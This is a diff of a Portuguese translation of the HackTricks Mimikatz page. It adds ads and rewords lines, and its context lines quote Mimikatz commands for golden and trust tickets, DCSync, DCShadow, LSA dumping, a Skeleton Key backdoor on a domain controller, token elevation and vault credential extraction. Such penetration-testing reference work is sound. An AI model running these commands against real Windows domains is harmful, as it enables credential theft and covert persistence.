@@ -1,19 +1,26 @@
 # Mimikatz
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 {% endhint %}
+
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Aprofunde sua experiência em **Segurança Móvel** com a 8kSec Academy. Domine a segurança de iOS e Android através de nossos cursos autônomos e obtenha certificação:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 
 **Esta página é baseada em uma do [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Confira o original para mais informações!
 
@@ -94,7 +101,7 @@ mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-12345678
 ```
 ### Criação de Ticket de Confiança
 
-Tickets de Confiança são usados para acessar recursos entre domínios aproveitando relacionamentos de confiança. Comando e parâmetros principais:
+Os Tickets de Confiança são usados para acessar recursos entre domínios aproveitando relacionamentos de confiança. Comando e parâmetros principais:
 
 - Comando: Semelhante ao Golden Ticket, mas para relacionamentos de confiança.
 - Parâmetros:
@@ -107,7 +114,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 ```
 ### Comandos Adicionais do Kerberos
 
-- **Listar Tickets**:
+- **Listando Tickets**:
 - Comando: `kerberos::list`
 - Lista todos os tickets do Kerberos para a sessão do usuário atual.
 
@@ -126,20 +133,21 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Limpa todos os tickets do Kerberos da sessão.
 - Útil antes de usar comandos de manipulação de tickets para evitar conflitos.
 
+
 ### Manipulação do Active Directory
 
 - **DCShadow**: Faz uma máquina agir temporariamente como um DC para manipulação de objetos do AD.
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Imitando um DC para solicitar dados de senha.
+- **DCSync**: Imitar um DC para solicitar dados de senha.
 - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
 ### Acesso a Credenciais
 
-- **LSADUMP::LSA**: Extrai credenciais do LSA.
+- **LSADUMP::LSA**: Extrair credenciais do LSA.
 - `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: Imitar um DC usando os dados de senha de uma conta de computador.
+- **LSADUMP::NetSync**: Impersonar um DC usando os dados de senha de uma conta de computador.
 - *Nenhum comando específico fornecido para NetSync no contexto original.*
 
 - **LSADUMP::SAM**: Acessar o banco de dados SAM local.
@@ -156,7 +164,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Diversos
 
-- **MISC::Skeleton**: Injeta um backdoor no LSASS em um DC.
+- **MISC::Skeleton**: Injetar um backdoor no LSASS em um DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Escalação de Privilégios
@@ -181,7 +189,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Adicionar: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
 - Modificar: *Nenhum comando específico para modificar no contexto original.*
 
-- **TOKEN::Elevate**: Imitar tokens.
+- **TOKEN::Elevate**: Impersonar tokens.
 - `mimikatz "token::elevate /domainadmin" exit`
 
 ### Serviços de Terminal
@@ -197,6 +205,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Extrair senhas do Cofre do Windows.
 - `mimikatz "vault::cred /patch" exit`
 
+
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Aprofunde sua experiência em **Segurança Móvel** com a 8kSec Academy. Domine a segurança de iOS e Android através de nossos cursos autônomos e obtenha certificação:
+
+{% embed url="https://academy.8ksec.io/" %}
 
 {% hint style="success" %}
 Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
